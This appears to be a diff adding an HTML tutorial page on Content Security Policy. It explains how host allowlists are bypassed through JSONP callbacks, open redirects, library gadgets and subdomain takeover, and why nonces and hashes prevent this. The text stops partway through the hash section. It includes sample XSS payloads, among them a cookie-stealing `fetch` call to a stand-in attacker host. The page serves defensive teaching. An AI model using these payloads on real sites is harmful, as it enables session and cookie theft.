@@ -1,0 +1,636 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>CSP Bypass Techniques — Why Nonces and Hashes Beat Allowlists</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link href="https://fonts.googleapis.com/css2?family=Playfair+Display:wght@400;700;900&family=Source+Code+Pro:wght@400;600&family=Lato:wght@300;400;700&display=swap" rel="stylesheet">
+<style>
+:root {
+  --bg:#0b0f1a; --bg2:#111827; --bg3:#1a2235; --card:#141c2e;
+  --border:#1e3a5f; --gold:#f5c842; --gold2:#c9a227;
+  --cyan:#38bdf8; --teal:#0d9488; --red:#f87171;
+  --green:#4ade80; --purple:#a78bfa; --orange:#fb923c;
+  --text:#e2e8f0; --muted:#7a9bbf; --code-bg:#060d1a;
+}
+*{margin:0;padding:0;box-sizing:border-box}
+html{scroll-behavior:smooth}
+body{background:var(--bg);color:var(--text);font-family:'Lato',sans-serif;font-size:17px;line-height:1.8;}
+
+.hero{min-height:100vh;display:flex;flex-direction:column;justify-content:center;align-items:center;text-align:center;position:relative;overflow:hidden;padding:3rem 2rem;}
+.hero-grid{position:absolute;inset:0;background-image:linear-gradient(var(--border) 1px,transparent 1px),linear-gradient(90deg,var(--border) 1px,transparent 1px);background-size:60px 60px;opacity:.4;animation:gridPulse 8s ease-in-out infinite alternate;}
+@keyframes gridPulse{from{opacity:.25}to{opacity:.5}}
+.hero-glow{position:absolute;width:700px;height:700px;border-radius:50%;background:radial-gradient(circle,rgba(248,113,113,.14) 0%,transparent 70%);top:50%;left:50%;transform:translate(-50%,-50%);animation:glow 6s ease-in-out infinite alternate;}
+@keyframes glow{from{transform:translate(-50%,-50%) scale(1)}to{transform:translate(-50%,-50%) scale(1.15)}}
+.hero-content{position:relative;z-index:2;max-width:950px}
+.hero-tag{display:inline-block;background:rgba(248,113,113,.12);border:1px solid rgba(248,113,113,.3);color:var(--red);font-size:.75rem;letter-spacing:.2em;text-transform:uppercase;padding:.4rem 1.2rem;border-radius:2rem;margin-bottom:2rem;}
+.hero h1{font-family:'Playfair Display',serif;font-size:clamp(2.6rem,6vw,5rem);font-weight:900;line-height:1.1;color:#fff;margin-bottom:1.5rem;}
+.hero h1 span{color:var(--red)}
+.hero-sub{font-size:1.1rem;color:var(--muted);max-width:720px;margin:0 auto 2.5rem;}
+.hero-stats{display:flex;gap:2rem;justify-content:center;flex-wrap:wrap;margin-top:1rem;}
+.hero-stat .num{font-family:'Source Code Pro',monospace;font-size:2rem;font-weight:700;color:var(--red);}
+.hero-stat .lbl{font-size:.72rem;letter-spacing:.15em;text-transform:uppercase;color:var(--muted);}
+.hero-scroll{display:flex;align-items:center;gap:.6rem;color:var(--muted);font-size:.85rem;letter-spacing:.1em;text-transform:uppercase;margin-top:3rem;}
+.scroll-line{width:40px;height:1px;background:var(--muted)}
+
+.toc{position:fixed;right:1.5rem;top:50%;transform:translateY(-50%);display:flex;flex-direction:column;gap:.5rem;z-index:100;}
+.toc-dot{width:8px;height:8px;border-radius:50%;background:var(--border);border:none;cursor:pointer;transition:all .3s;text-decoration:none;display:block;}
+.toc-dot:hover,.toc-dot.active{background:var(--red);transform:scale(1.4);}
+@media(max-width:900px){.toc{display:none}}
+
+.container{max-width:1020px;margin:0 auto;padding:0 2rem}
+section{padding:5rem 0}
+section:nth-child(even){background:var(--bg2)}
+.section-num{font-family:'Source Code Pro',monospace;font-size:.8rem;color:var(--teal);letter-spacing:.2em;text-transform:uppercase;margin-bottom:.5rem;}
+h2{font-family:'Playfair Display',serif;font-size:clamp(1.8rem,4vw,2.6rem);color:#fff;margin-bottom:1.2rem;line-height:1.2;}
+h2 .accent{color:var(--cyan)}
+h2 .accent.p{color:var(--purple)}
+h2 .accent.r{color:var(--red)}
+h3{font-family:'Playfair Display',serif;font-size:1.3rem;color:var(--red);margin:2rem 0 .8rem;}
+p{margin-bottom:1.2rem;color:var(--text)}
+strong{color:var(--gold);font-weight:700}
+em{color:var(--cyan);font-style:normal}
+ul,ol{padding-left:1.5rem;margin-bottom:1.2rem;}
+li{margin-bottom:.4rem;color:var(--text);}
+
+.reveal{opacity:0;transform:translateY(28px);transition:opacity .55s ease,transform .55s ease;}
+.reveal.visible{opacity:1;transform:none}
+
+.callout{border-left:4px solid var(--gold);background:rgba(245,200,66,.06);padding:1.2rem 1.5rem;border-radius:0 8px 8px 0;margin:1.8rem 0;}
+.callout.cyan{border-color:var(--cyan);background:rgba(56,189,248,.06)}
+.callout.green{border-color:var(--green);background:rgba(74,222,128,.06)}
+.callout.red{border-color:var(--red);background:rgba(248,113,113,.06)}
+.callout.purple{border-color:var(--purple);background:rgba(167,139,250,.06)}
+.callout.orange{border-color:var(--orange);background:rgba(251,146,60,.06)}
+.callout-title{font-family:'Source Code Pro',monospace;font-size:.75rem;letter-spacing:.15em;text-transform:uppercase;margin-bottom:.6rem}
+.callout.gold .callout-title,.callout-title.gold{color:var(--gold)}
+.callout.cyan .callout-title{color:var(--cyan)}
+.callout.green .callout-title{color:var(--green)}
+.callout.red .callout-title{color:var(--red)}
+.callout.purple .callout-title{color:var(--purple)}
+.callout.orange .callout-title{color:var(--orange)}
+
+.formula{background:var(--code-bg);border:1.5px solid var(--gold2);border-radius:10px;padding:1.4rem 2rem;text-align:center;margin:1.8rem 0;font-family:'Source Code Pro',monospace;font-size:1.1rem;color:var(--gold);letter-spacing:.04em;}
+.formula .label{display:block;font-size:.7rem;letter-spacing:.2em;text-transform:uppercase;color:var(--muted);margin-bottom:.6rem;font-family:'Lato',sans-serif;}
+.formula .sub{display:block;font-size:.82rem;color:var(--muted);margin-top:.6rem;font-family:'Lato',sans-serif;letter-spacing:0;}
+.formula.cyan{border-color:var(--cyan);color:var(--cyan)}
+.formula.red{border-color:var(--red);color:var(--red)}
+.formula.green{border-color:var(--green);color:var(--green)}
+
+pre{background:var(--code-bg);border:1px solid var(--border);border-radius:10px;padding:1.8rem;overflow-x:auto;margin:1.5rem 0;position:relative;}
+pre .tag{position:absolute;top:.6rem;right:1rem;font-family:'Source Code Pro',monospace;font-size:.65rem;letter-spacing:.15em;text-transform:uppercase;color:var(--muted);background:var(--bg3);padding:.2rem .6rem;border-radius:4px;}
+code{font-family:'Source Code Pro',monospace;font-size:.87rem;line-height:1.9;}
+.kw{color:#c792ea}.fn{color:#82aaff}.str{color:#c3e88d}.num{color:#f78c6c}.cm{color:#546e7a;font-style:italic}.cls{color:#ffcb6b}.var{color:var(--cyan)}.dir{color:var(--purple);font-weight:600}
+
+.data-table-wrap{overflow-x:auto;margin:1.8rem 0}
+table{border-collapse:collapse;width:100%;font-family:'Source Code Pro',monospace;font-size:.87rem;}
+th{background:var(--bg3);color:var(--gold);padding:.7rem 1.1rem;border:1px solid var(--border);text-align:left;letter-spacing:.06em;font-weight:600;}
+td{padding:.55rem 1.1rem;border:1px solid var(--border);color:var(--text);background:var(--card);}
+tr:hover td{background:var(--bg3)}
+td.hl{color:var(--cyan);font-weight:600} td.pos{color:var(--green)} td.neg{color:var(--red)} td.gold{color:var(--gold)}
+td.center{text-align:center}
+
+.step-list{list-style:none;padding:0;counter-reset:steps;margin:1.8rem 0;}
+.step-list li{counter-increment:steps;display:flex;gap:1.2rem;margin-bottom:1.8rem;align-items:flex-start;}
+.step-list li::before{content:counter(steps);flex-shrink:0;width:36px;height:36px;border-radius:50%;background:rgba(248,113,113,.15);border:1.5px solid var(--red);color:var(--red);font-family:'Source Code Pro',monospace;font-size:.85rem;font-weight:700;display:flex;align-items:center;justify-content:center;}
+.step-body strong{display:block;color:#fff;margin-bottom:.3rem;}
+
+.canvas-wrap{background:var(--code-bg);border:1px solid var(--border);border-radius:10px;overflow:hidden;margin:1.8rem 0;}
+.canvas-label{font-family:'Source Code Pro',monospace;font-size:.7rem;letter-spacing:.15em;text-transform:uppercase;color:var(--muted);padding:.6rem 1rem;border-bottom:1px solid var(--border);}
+canvas{display:block;width:100%;}
+
+.controls{display:flex;gap:1rem;flex-wrap:wrap;margin:1rem 0;align-items:center;}
+.ctrl-btn{background:rgba(56,189,248,.1);border:1.5px solid var(--cyan);color:var(--cyan);padding:.45rem 1.2rem;border-radius:6px;cursor:pointer;font-family:'Source Code Pro',monospace;font-size:.8rem;letter-spacing:.1em;text-transform:uppercase;transition:all .2s;}
+.ctrl-btn:hover{background:rgba(56,189,248,.22);}
+.ctrl-btn.gold{border-color:var(--gold);color:var(--gold);background:rgba(245,200,66,.08);}
+.ctrl-btn.gold:hover{background:rgba(245,200,66,.18);}
+.ctrl-btn.red{border-color:var(--red);color:var(--red);background:rgba(248,113,113,.08);}
+.ctrl-btn.red:hover{background:rgba(248,113,113,.18);}
+.ctrl-btn.purple{border-color:var(--purple);color:var(--purple);background:rgba(167,139,250,.08);}
+.ctrl-btn.purple:hover{background:rgba(167,139,250,.18);}
+.ctrl-btn.green{border-color:var(--green);color:var(--green);background:rgba(74,222,128,.08);}
+.ctrl-btn.green:hover{background:rgba(74,222,128,.18);}
+
+.stat-grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(160px,1fr));gap:1rem;margin:1.8rem 0;}
+.stat-card{background:var(--card);border:1px solid var(--border);border-radius:10px;padding:1.1rem;text-align:center;}
+.stat-card .val{font-family:'Source Code Pro',monospace;font-size:1.7rem;font-weight:700;color:var(--red);margin-bottom:.3rem;}
+.stat-card .lbl{font-size:.75rem;color:var(--muted);letter-spacing:.1em;text-transform:uppercase;}
+
+.family-grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(240px,1fr));gap:1rem;margin:1.8rem 0;}
+.family-card{background:var(--card);border:1px solid var(--border);border-radius:10px;padding:1.2rem;}
+.family-card .fam-header{display:flex;align-items:center;justify-content:space-between;margin-bottom:.7rem;}
+.family-card .fam-name{font-family:'Source Code Pro',monospace;font-size:.78rem;letter-spacing:.12em;text-transform:uppercase;font-weight:600;}
+.family-card .fam-count{font-family:'Source Code Pro',monospace;font-size:.75rem;background:rgba(56,189,248,.1);border:1px solid rgba(56,189,248,.25);color:var(--cyan);padding:.15rem .55rem;border-radius:3px;}
+.family-card .fam-desc{font-size:.88rem;color:var(--muted);line-height:1.5;margin-bottom:.8rem;}
+.feat-list{display:flex;flex-wrap:wrap;gap:.4rem;}
+.feat-pill{font-family:'Source Code Pro',monospace;font-size:.72rem;padding:.2rem .55rem;border-radius:3px;white-space:nowrap;}
+
+.compare-grid{display:grid;grid-template-columns:1fr 1fr 1fr;gap:1.2rem;margin:1.8rem 0;}
+@media(max-width:900px){.compare-grid{grid-template-columns:1fr}}
+.compare-grid.two{grid-template-columns:1fr 1fr;}
+@media(max-width:640px){.compare-grid.two{grid-template-columns:1fr}}
+.compare-card{background:var(--card);border:1px solid var(--border);border-radius:10px;padding:1.3rem;}
+.compare-card h4{font-family:'Source Code Pro',monospace;font-size:.75rem;letter-spacing:.14em;text-transform:uppercase;margin-bottom:.8rem;}
+.compare-card.good h4{color:var(--green)} .compare-card.bad h4{color:var(--red)} .compare-card.mid h4{color:var(--orange)}
+
+.pipeline{display:flex;align-items:stretch;gap:.6rem;margin:1.8rem 0;overflow-x:auto;padding-bottom:.5rem;}
+.pipe-stage{flex:1;min-width:130px;background:var(--card);border:1px solid var(--border);border-radius:10px;padding:1rem .9rem;text-align:center;position:relative;}
+.pipe-stage .pipe-icon{font-size:1.5rem;margin-bottom:.4rem;}
+.pipe-stage .pipe-name{font-family:'Source Code Pro',monospace;font-size:.78rem;color:var(--red);letter-spacing:.05em;margin-bottom:.3rem;}
+.pipe-stage .pipe-desc{font-size:.76rem;color:var(--muted);line-height:1.4;}
+.pipe-arrow{display:flex;align-items:center;color:var(--muted);font-size:1.2rem;flex-shrink:0;}
+@media(max-width:760px){.pipeline{flex-direction:column}.pipe-arrow{transform:rotate(90deg);justify-content:center;padding:.2rem 0;}}
+
+.glossary-grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(280px,1fr));gap:1.1rem;margin-top:1.5rem;}
+.glossary-card{background:var(--card);border:1px solid var(--border);border-radius:10px;padding:1.1rem 1.3rem;}
+.glossary-term{font-family:'Source Code Pro',monospace;font-size:.8rem;color:var(--gold);letter-spacing:.07em;margin-bottom:.35rem;text-transform:uppercase;}
+.glossary-def{font-size:.9rem;color:var(--muted);line-height:1.6;}
+
+.sidenote{background:var(--card);border:1px dashed var(--muted);border-radius:10px;padding:1.1rem 1.4rem;margin:1.8rem 0;font-size:.92rem;color:var(--muted);}
+.sidenote b{color:var(--gold)}
+
+footer{padding:3rem 2rem;text-align:center;border-top:1px solid var(--border);color:var(--muted);font-size:.85rem;}
+footer a{color:var(--cyan);text-decoration:none;}
+</style>
+</head>
+<body>
+
+<nav class="toc">
+  <a class="toc-dot" href="#hero" title="Intro"></a>
+  <a class="toc-dot" href="#recap" title="Recap"></a>
+  <a class="toc-dot" href="#weakness" title="Why Allowlists Are Weaker"></a>
+  <a class="toc-dot" href="#jsonp" title="JSONP Bypass"></a>
+  <a class="toc-dot" href="#otherbypass" title="Other Bypass Classes"></a>
+  <a class="toc-dot" href="#nonce" title="Nonce-Based CSP"></a>
+  <a class="toc-dot" href="#hash" title="Hash-Based CSP"></a>
+  <a class="toc-dot" href="#demo" title="Live Demo"></a>
+  <a class="toc-dot" href="#compare" title="Compare All Three"></a>
+  <a class="toc-dot" href="#glossary" title="Glossary"></a>
+</nav>
+
+<!-- HERO -->
+<section class="hero" id="hero">
+  <div class="hero-grid"></div>
+  <div class="hero-glow"></div>
+  <div class="hero-content">
+    <div class="hero-tag">Web Security · Advanced CSP · Offense-Informed Defense</div>
+    <h1>CSP Bypass Techniques,<br>and Why <span>Nonces &amp; Hashes</span> Beat Allowlists</h1>
+    <p class="hero-sub">A host-based allowlist like <code>script-src https://cdn.example.com</code> looks airtight on paper. It isn't. CSP checks <em>where</em> a script claims to come from — not whether that source itself can be tricked into serving attacker-controlled content. If any endpoint on an allowlisted host can be turned into a script-shaped response, the allowlist doesn't block the attacker. It vouches for them. This lesson walks through exactly how that happens, and why nonces and hashes close the gap by authenticating the script itself.</p>
+    <div class="hero-stats">
+      <div class="hero-stat"><div class="num">1</div><div class="lbl">Trusted Host Is Enough</div></div>
+      <div class="hero-stat"><div class="num">128</div><div class="lbl">Bits of Randomness Per Nonce</div></div>
+      <div class="hero-stat"><div class="num">sha256</div><div class="lbl">Hash Algorithm, Exact Match</div></div>
+      <div class="hero-stat"><div class="num">0</div><div class="lbl">Trust Placed In "Where"</div></div>
+    </div>
+    <div class="hero-scroll"><div class="scroll-line"></div>Scroll to explore<div class="scroll-line"></div></div>
+  </div>
+</section>
+
+<!-- SECTION 0: RECAP -->
+<section id="recap">
+<div class="container">
+  <div class="section-num">00 — Quick Recap</div>
+  <h2>The Allowlist We're About to <span class="accent r">Break</span></h2>
+
+  <p class="reveal">The companion explainer lesson covered the basic shape of CSP: a header like <code>script-src 'self' https://cdn.jsdelivr.net</code> tells the browser to only execute scripts loaded from those two origins, refusing everything else — including an attacker's injected <code>&lt;script&gt;</code> tag, which has no matching source at all.</p>
+
+  <p class="reveal">That story is true, and it's genuinely useful. But it quietly assumes something: that every origin on the allowlist only ever serves content the site owner actually wrote and controls. This lesson is about what happens when that assumption breaks — and about the two mechanisms, <strong>nonces</strong> and <strong>hashes</strong>, that were specifically designed because it breaks more often than people expect.</p>
+
+  <div class="callout purple reveal">
+    <div class="callout-title">🎯 The Question This Lesson Answers</div>
+    CSP's <code>script-src</code> allowlist checks one thing: the <em>origin</em> a script was fetched from. It never inspects <em>what the script actually contains</em>. So the real question an attacker asks isn't "how do I get my script onto the allowlist?" — it's <strong>"is there anything, anywhere, on a host that's already on the allowlist, that will return attacker-controlled JavaScript?"</strong> On a big enough host, the answer is very often yes.
+  </div>
+</div>
+</section>
+
+<!-- SECTION 1: WHY ALLOWLISTS ARE WEAKER THAN THEY LOOK -->
+<section id="weakness">
+<div class="container">
+  <div class="section-num">01 — The Core Weakness</div>
+  <h2>Why Host-Based <span class="accent r">Allowlisting</span> Is Weaker Than It Looks</h2>
+
+  <p class="reveal">Here's the assumption baked into every <code>script-src https://trusted-host.com</code> policy: "I trust <em>this entire host</em> to only ever serve script content I intended." That's a much bigger promise than it sounds like, because a modern host is rarely one thing. It's a whole application, often with:</p>
+
+  <ul class="reveal">
+    <li>Legacy API endpoints nobody has decommissioned — including old <strong>JSONP</strong> callback endpoints from an era before CORS was well-supported.</li>
+    <li>User-generated content areas — profile pages, file uploads, sandboxed iframes — that happen to share the same origin as the trusted static assets.</li>
+    <li><strong>Open redirect</strong> endpoints (login flows, analytics click-trackers, "continue to" links) that will happily 302 a browser to any URL an attacker supplies.</li>
+    <li>Their own third-party scripts, analytics tags, or ad code — each one another potential injection point that now inherits your trust, not just theirs.</li>
+    <li>Subdomains the "host" nominally covers but the security team doesn't actively audit — a forgotten <code>demo.trusted-host.com</code> pointing at a decommissioned cloud bucket, ripe for takeover.</li>
+  </ul>
+
+  <p class="reveal">CSP's allowlist check happens at the <strong>origin</strong> level — scheme, host, and (if specified) port. It has no concept of "this path is fine, but that path is dangerous." If <em>any</em> URL under an allowlisted origin can be coerced into responding with attacker-controlled JavaScript, that URL is just as trusted as <code>/jquery.min.js</code> was always meant to be. The browser has no way to tell them apart — both requests come back with <code>Content-Type: application/javascript</code> from a host on the list, and CSP's job is already done by the time it checked the origin.</p>
+
+  <div class="callout gold reveal">
+    <div class="callout-title">💡 The Mental Model Shift</div>
+    Stop thinking of <code>script-src</code> as an allowlist of <em>trusted code</em>. It's an allowlist of <em>trusted origins</em> — and "trusted origin" and "every byte ever served from that origin is safe to execute as JavaScript" are very different guarantees. The gap between those two ideas is exactly where every bypass in this lesson lives.
+  </div>
+</div>
+</section>
+
+<!-- SECTION 2: JSONP BYPASS -->
+<section id="jsonp">
+<div class="container">
+  <div class="section-num">02 — Concrete Bypass #1</div>
+  <h2>The <span class="accent r">JSONP</span> Bypass, Walked Through</h2>
+
+  <p class="reveal">JSONP ("JSON with Padding") is an old workaround from before Cross-Origin Resource Sharing existed. A client wants JSON data from another origin, but the browser's same-origin policy blocks a plain cross-origin <code>fetch</code>. The trick: load the "data" as a <code>&lt;script&gt;</code> tag instead — scripts aren't subject to the same-origin restriction — and have the server wrap the JSON in a function call, using a callback name the <em>client</em> supplies via a query parameter.</p>
+
+  <pre class="reveal"><span class="tag">a legacy jsonp endpoint</span><code><span class="cm">// GET https://api.example.com/data?callback=handleData</span>
+<span class="cm">// server responds with Content-Type: application/javascript</span>
+
+<span class="fn">handleData</span>({<span class="str">"user"</span>: <span class="str">"bob"</span>, <span class="str">"id"</span>: <span class="num">42</span>})
+
+<span class="cm">// the client had already defined window.handleData = function(json){...}</span>
+<span class="cm">// so this "script" just calls their own function with the data</span></code></pre>
+
+  <p class="reveal">Notice the vulnerability sitting in plain sight: the server takes the <code>callback</code> value straight from the query string and writes it, unescaped, directly before the opening parenthesis of a script response. It was designed to let the client name a function. Nothing stops the client from putting <em>arbitrary JavaScript</em> there instead.</p>
+
+  <p class="reveal">Now imagine a victim site ships this policy, trusting a real API host with a JSONP endpoint it forgot about:</p>
+
+  <div class="formula red reveal">
+    <span class="label">The vulnerable policy</span>
+    Content-Security-Policy: script-src https://api.example.com
+    <span class="sub">Looks strict — one specific, presumably-trusted host. It isn't strict enough.</span>
+  </div>
+
+  <ol class="step-list reveal">
+    <li><div class="step-body"><strong>Attacker finds the injection point</strong>Some page on the victim site reflects unescaped user input — the exact kind of gap the companion lesson described. Say a search field.</div></li>
+    <li><div class="step-body"><strong>Attacker crafts a script tag pointing at the trusted host's JSONP endpoint</strong><code>&lt;script src="https://api.example.com/data?callback=alert(document.cookie)//"&gt;&lt;/script&gt;</code> — the trailing <code>//</code> comments out the rest of the real response so it doesn't cause a syntax error.</div></li>
+    <li><div class="step-body"><strong>Victim's browser checks CSP</strong>The script's origin is <code>https://api.example.com</code> — which <em>is</em> on the allowlist. CSP approves the load without hesitation.</div></li>
+    <li><div class="step-body"><strong>The "trusted" response is actually attacker-controlled</strong>The server dutifully echoes the callback parameter back as executable code: <code>alert(document.cookie)({"user":"bob"...})//...</code> — and the browser runs it.</div></li>
+    <li><div class="step-body"><strong>Full script execution, CSP never violated</strong>No console error. No blocked-uri report. As far as CSP is concerned, this was a completely ordinary, fully authorized script load from an allowlisted origin.</div></li>
+  </ol>
+
+  <div class="callout red reveal">
+    <div class="callout-title">⚠️ Why This Is So Uncomfortable</div>
+    This bypass doesn't require finding a second XSS bug on the victim site beyond the original injection point. It doesn't require compromising <code>api.example.com</code> either — that host is doing exactly what it was built to do. The vulnerability is structural: <strong>CSP vouched for an origin, and that origin had a feature that turns user input into executable code.</strong> The allowlist did its job perfectly and the attacker still won.
+  </div>
+</div>
+</section>
+
+<!-- SECTION 3: OTHER BYPASS CLASSES -->
+<section id="otherbypass">
+<div class="container">
+  <div class="section-num">03 — More Ways In</div>
+  <h2>Other <span class="accent r">"Trusted Origin, Untrusted Content"</span> Bypasses</h2>
+
+  <p class="reveal">JSONP is the classic teaching example, but it's one instance of a broader pattern. Anywhere a trusted origin will echo attacker-influenced content back as (or leading to) executable script, the allowlist stops mattering.</p>
+
+  <div class="data-table-wrap reveal">
+    <table>
+      <thead><tr><th>Bypass Class</th><th>Vulnerable Policy Example</th><th>How It's Abused</th></tr></thead>
+      <tbody>
+        <tr><td class="hl">JSONP reflection</td><td><code>script-src https://api.example.com</code></td><td>Callback parameter reflected unescaped into a script response — attacker supplies JS instead of a function name.</td></tr>
+        <tr><td class="hl">Open redirect</td><td><code>script-src https://trusted.com</code></td><td><code>trusted.com/go?url=evil.com/x.js</code> 302-redirects to attacker infrastructure; the browser follows it, and the <em>initial request's</em> origin was on the allowlist.</td></tr>
+        <tr><td class="hl">Angular/library gadget</td><td><code>script-src https://cdn.example.com</code></td><td>An old, allowlisted library version hosted on that CDN has its own known XSS/sandbox-escape bug — attackers load the vulnerable old version instead of the current one.</td></tr>
+        <tr><td class="hl">Wildcard subdomain</td><td><code>script-src *.example.com</code></td><td>Attacker takes over an expired or misconfigured subdomain (dangling DNS, abandoned cloud bucket) and serves a payload from it — fully within the wildcard.</td></tr>
+        <tr><td class="hl">Upload / user-content path</td><td><code>script-src https://static.example.com</code></td><td>The same host also serves user-uploaded files under a path with a permissive Content-Type — attacker uploads a ".js"-servable payload.</td></tr>
+        <tr><td class="hl">'unsafe-inline' present</td><td><code>script-src 'self' 'unsafe-inline'</code></td><td>Not really a bypass at all — it simply un-does CSP's script protection outright, allowing any injected inline script to run.</td></tr>
+      </tbody>
+    </table>
+  </div>
+
+  <p class="reveal">Notice the pattern across every row except the last: <strong>none of these require breaking CSP's enforcement logic.</strong> The browser is checking the allowlist correctly, every time. The failure is entirely in what the allowlist was asked to trust in the first place — an origin, treated as a single unit of trust, when in reality it's a whole application surface with its own bugs, features, and forgotten corners.</p>
+
+  <div class="sidenote reveal">
+    <b>Real-world footnote.</b> Google's own <code>www.google.com</code> has historically had JSONP-style and open-redirect endpoints documented as CSP bypass vectors in security research — precisely because it's exactly the kind of large, historically deep, feature-rich host that ends up on a great many allowlists. Being a huge, reputable, well-secured company doesn't shrink the attack surface of "every endpoint we've ever shipped."
+  </div>
+</div>
+</section>
+
+<!-- SECTION 4: NONCE-BASED CSP -->
+<section id="nonce">
+<div class="container">
+  <div class="section-num">04 — The Fix, Part One</div>
+  <h2>Nonce-Based CSP: <span class="accent r">Authenticate the Script</span>, Not the Host</h2>
+
+  <p class="reveal">A <strong>nonce</strong> ("<strong>n</strong>umber used <strong>once</strong>") flips the entire question CSP asks. Instead of "did this script come from a host I trust," the policy asks: <strong>"does this script carry a secret token that only my own server could have handed out for this exact page load?"</strong> Origin becomes irrelevant. What matters is possession of a value an attacker has no way to guess or observe in advance.</p>
+
+  <ol class="step-list reveal">
+    <li><div class="step-body"><strong>Server generates a fresh random value, per response</strong>A cryptographically random value — typically 128 bits, base64-encoded — generated fresh on <em>every single page render</em>. Never reused, never predictable, never derived from anything an attacker could compute.</div></li>
+    <li><div class="step-body"><strong>The nonce goes into the CSP header</strong><code>Content-Security-Policy: script-src 'nonce-r4nd0mBase64Value'</code> — this is the value the browser will check every script tag against for this document.</div></li>
+    <li><div class="step-body"><strong>The same nonce goes onto every legitimate &lt;script&gt; tag</strong>The server's templating layer stamps the identical value onto each script tag it renders: <code>&lt;script nonce="r4nd0mBase64Value" src="/app.js"&gt;&lt;/script&gt;</code>.</div></li>
+    <li><div class="step-body"><strong>Browser checks the attribute, not the origin</strong>For every script the page tries to run, the browser checks: does its <code>nonce</code> attribute exactly match the value in the CSP header? If yes, it runs — origin doesn't matter at all anymore for nonce-covered policies. If no (or missing), it's blocked, full stop.</div></li>
+    <li><div class="step-body"><strong>An injected script has no way to know the nonce</strong>The attacker's payload lands in the HTML the same way it always did. But they were never handed this page load's nonce — it's generated fresh, server-side, and never exposed anywhere an injected script could read it before it needs to declare its own (nonexistent) matching attribute.</div></li>
+  </ol>
+
+  <pre class="reveal"><span class="tag">nonce-based csp in practice</span><code><span class="cm">// Response header (fresh value every single response):</span>
+<span class="dir">Content-Security-Policy:</span> <span class="dir">script-src</span> <span class="str">'nonce-8f4A2xQ9pLk3vR7z'</span> <span class="str">'strict-dynamic'</span>;
+
+<span class="cm">// Legitimate script tag, stamped by the server template:</span>
+<span class="kw">&lt;script</span> <span class="var">nonce</span>=<span class="str">"8f4A2xQ9pLk3vR7z"</span> <span class="var">src</span>=<span class="str">"/app.js"</span><span class="kw">&gt;&lt;/script&gt;</span>
+<span class="cm">// → ALLOWED: nonce attribute matches the header value exactly.</span>
+
+<span class="cm">// Attacker's injected payload, landed via an unrelated escaping bug:</span>
+<span class="kw">&lt;script&gt;</span><span class="fn">fetch</span>(<span class="str">'https://evil.example/steal?c='</span>+document.cookie)<span class="kw">&lt;/script&gt;</span>
+<span class="cm">// → BLOCKED: no nonce attribute at all. The attacker had no way to</span>
+<span class="cm">//   learn "8f4A2xQ9pLk3vR7z" — it didn't exist until this exact response.</span></code></pre>
+
+  <div class="callout purple reveal">
+    <div class="callout-title">🔑 strict-dynamic: The Companion Keyword</div>
+    Modern apps often load scripts dynamically — a nonce-carrying script that itself injects a second <code>&lt;script&gt;</code> tag at runtime (a common bundler/module-loader pattern). Adding <code>'strict-dynamic'</code> to the policy says: "any script with a valid nonce is trusted to load further scripts, and those child scripts inherit that trust — but plain origin allowlists are now ignored entirely." This is what closes the JSONP and open-redirect bypasses outright: <code>strict-dynamic</code> means an origin being on some legacy allowlist entry no longer grants anything.
+  </div>
+
+  <div class="callout orange reveal">
+    <div class="callout-title">⚠️ Nonces Only Work If The Randomness Is Real</div>
+    A nonce that's predictable, reused across requests, or derived from something guessable (a timestamp, a sequential counter, a value also leaked elsewhere on the page) collapses back to a static allowlist an attacker can eventually satisfy. It must be generated fresh per HTTP response with a cryptographically secure random source, and never logged, cached, or exposed anywhere an attacker could read it ahead of time.
+  </div>
+</div>
+</section>
+
+<!-- SECTION 5: HASH-BASED CSP -->
+<section id="hash">
+<div class="container">
+  <div class="section-num">05 — The Fix, Part Two</div>
+  <h2>Hash-Based CSP: <span class="accent r">Authenticate the Content</span> Itself</h2>
+
+  <p class="reveal">A <strong>hash</strong>-based policy takes the same "trust the script, not the source" idea and applies it somewhere nonces don't fit well: static inline scripts that never change between page loads. Instead of a per-request random token, the CSP header lists the exact cryptographic hash of each allowed inline script's <em>content</em>.</p>
+
+  <pre class="reveal"><span class="tag">hash-based csp in practice</span><code><span class="cm">// The inline script, byte-for-byte, exactly as it appears in the HTML:</span>
+<span class="kw">&lt;script&gt;</span><span class="kw">var</span> <span class="var">x</span> = <span class="num">1</span>;<span class="kw">&lt;/script&gt;</span>
+
+<span class="cm">// SHA-256 of the exact contents between the tags: "var x = 1;"</span>
+<span class="cm">// (including whitespace — this must match byte-for-byte)</span>
+<span class="dir">Content-Security-Policy:</span> <span class="dir">script-src</span> <span class="str">'sha256-qznLcsROx4GACP2dm0UCKCzCG+HiZ1guq6ZZDob/Tng='</span>;
+
+<span class="cm">// The browser computes the SHA-256 hash of every inline script it</span>
+<span class="cm">// encounters and checks it against the allowed hash list. Only an</span>
+<span class="cm">// EXACT content match — down to the whitespace — is permitted.</span></code></pre>
+
+  <p class="reveal">The security property is the same one nonces provide, arrived at differently: an attacker's injected script has <em>different content</em> than any of the pre-approved scripts (that's the whole point of injecting something new), so it will never produce a hash that matches an entry in the allowlist. There's no token to steal or predict — the content itself <em>is</em> the credential, and the attacker can't forge a hash collision on demand with any algorithm CSP actually supports (SHA-256, SHA-384, SHA-512).</p>
+
+  <div class="compare-grid two reveal">
+    <div class="compare-card good">
+      <h4>✅ Good Fit For Hashes</h4>
+      Static inline scripts that never change between deploys — a small bootstrap snippet, a fixed analytics init block, a JSON-LD structured-data script. Compute once at build time, ship the hash alongside the code.
+    </div>
+    <div class="compare-card bad">
+      <h4>⚠️ Poor Fit For Hashes</h4>
+      Inline scripts whose content is <em>dynamically generated per request</em> — say, one that embeds a server-rendered user ID or CSRF token inline. Every distinct rendered value produces a different hash, so hashes don't scale here; nonces (which cover the whole tag regardless of content) are the better tool.
+    </div>
+  </div>
+
+  <div class="sidenote reveal">
+    <b>Whitespace matters — literally.</b> Hash-based CSP hashes the exact text content of the script element, character for character. A trailing newline added by a linter, a minifier that changes whitespace, or a templating engine that reformats output between builds will silently change the hash and break the policy (fail closed — the script gets blocked, not silently allowed). This is a common source of "CSP broke my app after a routine deploy" bug reports.
+  </div>
+
+  <p class="reveal">Watch what happens when an attacker tries to reuse a hash that was meant for something else entirely — this is exactly why "exact content match" is such a strong guarantee:</p>
+
